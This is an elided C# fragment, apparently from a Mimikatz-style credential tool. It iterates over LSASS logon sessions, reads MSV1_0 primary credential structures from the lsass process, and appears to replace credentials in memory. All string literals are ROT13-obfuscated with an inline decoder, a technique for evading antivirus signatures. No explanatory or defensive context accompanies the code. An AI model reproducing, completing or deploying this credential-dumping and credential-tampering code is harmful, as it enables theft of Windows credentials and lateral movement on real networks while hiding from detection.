            ...
            foreach (Logon logon in logonlist)
            {
                ...
                if (lsasscred != IntPtr.Zero)
                {
                    ...
                    while (lsasscred != IntPtr.Zero)
                    {
                        ...
                        IntPtr pPrimaryCredentials = new IntPtr(BitConverter.ToInt64(credentialsBytes, Utility.FieldOffset<KIWI_MSV1_0_CREDENTIALS>(new string("CevznelPerqragvnyf".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()))));
                        IntPtr pNext = new IntPtr(BitConverter.ToInt64(credentialsBytes, Utility.FieldOffset<KIWI_MSV1_0_CREDENTIALS>(new string("arkg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()))));
                        ...
                        while (lsasscred != IntPtr.Zero)
                        {
                            ...
                            if (Utility.ExtractANSIStringString(hLsass, primaryCredentials.Primary).Equals(new string("Cevznel".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                            {
                                ...
                                {
                                    Console.WriteLine(new string("[k] Fbzrguvat tbrf jebat".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                                }
                                else
                                {
                        ...
                        while (lsasscred != IntPtr.Zero)
                        {
                            ...
                            while (lsasscred != IntPtr.Zero)
                            {
                                ...
                                if (Utility.ExtractANSIStringString(hLsass, primaryCredentials.Primary).Equals(new string("Cevznel".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray())))
                                {
                                    ...
                                    {
                                        Console.WriteLine(new string(" Reebe ercynpvat perqragvny".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                                        return 1;
                                    }
